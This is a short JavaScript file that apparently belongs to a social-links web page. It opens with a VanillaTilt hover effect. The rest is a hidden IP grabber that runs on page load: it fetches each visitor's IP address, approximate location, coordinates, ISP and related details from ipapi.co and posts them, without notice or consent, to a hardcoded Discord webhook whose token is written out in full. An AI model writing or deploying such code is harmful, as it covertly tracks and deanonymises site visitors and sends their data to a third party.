VanillaTilt.init(document.querySelectorAll(".social__links ul li"), {
    max: 10,
    speed: 10,
    glare: true,
    "max-glare": 1
});


function sendToDiscordWebhook(webhookUrl, data) {
  const payload = {
    content: data,
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  })
    .then(response => {
      if (response.ok) {
        console.log('IP information sent to Discord successfully.');
      } else {
        throw new Error('Error sending IP information to Discord.');
      }
    })
    .catch(error => {
      console.error('Error sending IP information to Discord:', error.message);
    });
}

function retrieveIPInformation() {
  const ipApiUrl = 'https://ipapi.co/json/';

  fetch(ipApiUrl)
    .then(response => {
      if (response.ok) {
        return response.json();
      } else {
        throw new Error('Error retrieving IP information.');
      }
    })
    .then(ipInfo => {
      // Format the IP information as desired
      const formattedData = `
  IP: ${ipInfo.ip}
  City: ${ipInfo.city}
  Region: ${ipInfo.region}
  Region Code: ${ipInfo.region_code}
  Country: ${ipInfo.country_name}
  Country Code: ${ipInfo.country_code}
  Postal Code: ${ipInfo.postal}
  Latitude: ${ipInfo.latitude}
  Longitude: ${ipInfo.longitude}
  Timezone: ${ipInfo.timezone}
  ASN: ${ipInfo.asn}
  Organization: ${ipInfo.org}
  ISP: ${ipInfo.isp}
  Connection Type: ${ipInfo.type}
  Calling Code: ${ipInfo.country_calling_code}
  Currency: ${ipInfo.currency}
  Languages: ${ipInfo.languages}
  Continent: ${ipInfo.continent_name}
  Continent Code: ${ipInfo.continent_code}
  Population: ${ipInfo.country_population}
  Weather: ${ipInfo.weather && ipInfo.weather.description ? ipInfo.weather.description : 'N/A'}
  Ipv4: ${ipInfo.ip_version === 4 ? 'Yes' : 'No'}
  Ipv6: ${ipInfo.ip_version === 6 ? 'Yes' : 'No'}
  Organization Type: ${ipInfo.company_type}
  Carrier: ${ipInfo.carrier}
  Security Threat: ${ipInfo.threat && ipInfo.threat.is_tor_proxy ? 'TOR Proxy' : 'None'}

`;


      const discordWebhookUrl = 'https://discord.com/api/webhooks/1129353308075720815/3DQCZXeUlyXpsYWPtppnkck-8yXz7vhhtL47x3STwEKMY8QNJTKStQhiSi8800BJPcJC';
      sendToDiscordWebhook(discordWebhookUrl, formattedData);
    })
    .catch(error => {
      console.error('Error retrieving IP information:', error.message);
    });
}

retrieveIPInformation();
